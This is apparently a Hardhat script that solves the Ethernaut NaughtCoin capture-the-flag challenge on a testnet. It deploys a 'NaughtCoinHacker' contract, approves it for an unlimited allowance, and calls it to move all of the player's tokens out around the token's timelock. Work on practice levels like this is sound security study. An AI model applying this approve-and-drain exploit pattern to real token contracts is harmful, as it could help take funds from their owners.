// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    naughtCoin = await ethers.getContractAt("NaughtCoin", process.env.NAUGHTCOIN_ADDRESS);
    hacker = await (await ethers.getContractFactory("NaughtCoinHacker")).deploy(process.env.NAUGHTCOIN_ADDRESS);
    hacker.deployed();
    transactionResponse = await naughtCoin.connect(player).approve(hacker.address, ethers.constants.MaxUint256);
    await transactionResponse.wait();
    await (await hacker.transferAllTokens()).wait();
    console.log("player is", player.address)
    console.log("NaughtCoin balance of player is", (await naughtCoin.balanceOf(player.address)).toString());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli